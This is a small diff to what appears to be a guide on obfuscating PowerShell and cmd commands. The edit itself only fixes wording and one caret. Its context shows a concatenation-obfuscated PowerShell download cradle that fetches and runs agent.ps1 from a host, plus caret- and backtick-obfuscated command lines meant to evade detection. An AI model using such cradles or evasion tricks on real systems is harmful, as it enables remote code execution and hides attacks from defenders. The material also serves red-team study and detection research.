@@ -122,11 +122,11 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 
       power'+'shell IEX (New-Ob'+'ject Net.'+'WebCl'+'ient).Do'+'wnloadSt'+'ring('//192.16'+'8.1.71/agent.ps1')
 
-- Using an **batch** local variable inside powershell interpreter
+- Using an **batch** local variable inside the powershell interpreter
 
       cmd.exe /c "set var=Get-Date && cmd.exe /c echo %var%^" | powershell.exe
 
-      c`m`d.e`xe /c "s^et va^r=Get-Date && c^md^.e^xe /c e^cho %var%^" | power`shel`l.e`x`e
+      c`m`d.e`xe /c "s^et va^r=Get-Date && c^md^.e^xe /c e^ch^o %var%^" | power`shel`l.e`x`e
 
 ![powershell obfuscation](http://i.cubeupload.com/uDdG3G.jpg)
 
